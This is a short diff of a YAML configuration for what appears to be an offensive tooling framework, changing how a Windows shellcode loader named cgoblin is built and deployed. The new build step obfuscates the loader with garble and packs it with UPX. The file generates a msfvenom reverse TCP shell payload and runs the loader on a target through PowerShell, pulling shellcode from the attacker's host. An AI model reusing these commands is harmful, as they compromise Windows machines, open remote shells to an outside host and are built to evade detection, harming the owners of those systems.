@@ -17,7 +17,7 @@ tool:
   name: cgoblin_windows
   repo_url: https://github.com/grisuno/cgoblin.git
   install_path: external/.exploit/cgoblin
-  install_command: GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o loader_windows.exe
-  execute_command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_windows.txt ; cp loader_windows.exe ../../../sessions/
-  upload_file: no_priv sessions/loader_windows.exe
+  install_command: GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc garble -literals -tiny build -ldflags="-s -w" -o loader_windows.exe ; upx loader_windows.exe
+  execute_command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_windows.txt
+  upload_file: no_priv ./external/.exploit/cgoblin/loader_windows.exe
   remote_command: no_priv powershell .\loader_windows.exe -url http://{lhost}/shellcode_windows.txt
